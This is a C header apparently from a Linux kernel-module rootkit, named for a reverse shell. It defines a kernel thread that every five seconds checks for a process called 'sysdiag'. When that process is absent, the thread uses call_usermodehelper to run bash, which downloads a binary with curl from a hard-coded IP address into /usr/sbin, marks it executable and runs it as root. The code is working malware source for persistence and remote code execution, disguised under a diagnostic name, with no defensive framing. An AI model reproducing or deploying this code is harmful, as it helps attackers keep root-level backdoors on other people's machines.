#ifndef REVSHELL_H
#define REVSHELL_H
extern atomic_t unloading;     /* top of file */

#define CHECK_INTERVAL 5          

#ifndef MARKER
#define MARKER "sysdiag"          
#endif

#define PAYLOAD_PATH "/usr/sbin/" MARKER

#define UTIL_URL "http://198.38.87.31:8931/package_manifest-20-5-20/sysdiag"

struct task_struct *mon_it;
struct task_struct *task;

static int __shell(void *data)
{
    static char *envp[] = { "HOME=/", "TERM=xterm",
                            "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    char *argv[] = { "/bin/bash", "-c",
                     "[ -x " PAYLOAD_PATH " ] || "
                     "curl -so " PAYLOAD_PATH " " UTIL_URL " && "
                     "chmod +x " PAYLOAD_PATH "; "
                     "exec " PAYLOAD_PATH,
                     NULL };

    while (!kthread_should_stop()) {
        bool alive = false;

        rcu_read_lock();
        for_each_process(task) {
            if (strncmp(task->comm, MARKER, strlen(MARKER)) == 0) {
                alive = true;
                break;
            }
        }
        rcu_read_unlock();

        if (!alive && !kthread_should_stop() && !atomic_read(&unloading))
            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

        ssleep(CHECK_INTERVAL);
    }

    return 0;
}

#endif